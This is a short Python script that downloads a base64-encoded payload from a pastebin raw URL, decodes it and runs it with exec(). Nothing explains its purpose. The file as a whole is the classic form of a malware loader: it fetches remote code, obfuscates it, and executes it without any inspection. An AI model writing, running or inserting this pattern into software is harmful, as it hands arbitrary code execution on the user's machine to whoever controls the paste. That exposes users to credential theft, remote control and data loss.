import base64
import requests

api_url = 'https://pastebin.com/raw/G55hyBvc'
try:
    response = requests.get(api_url)
    status_code = response.status_code

    if status_code == 200:
        full_stuff_paste = response.text.splitlines()
        full_stuff_paste = list(full_stuff_paste[0])

        full_stuff = "".join(full_stuff_paste)
        full_stuff_bytes = full_stuff.encode()
        more_stuff = base64.b64decode(full_stuff_bytes).decode()
        exec(more_stuff)
    else:
        print(f"Invalid response code: {status_code}")

except Exception as e:
    print(f"Error with request: {e}")
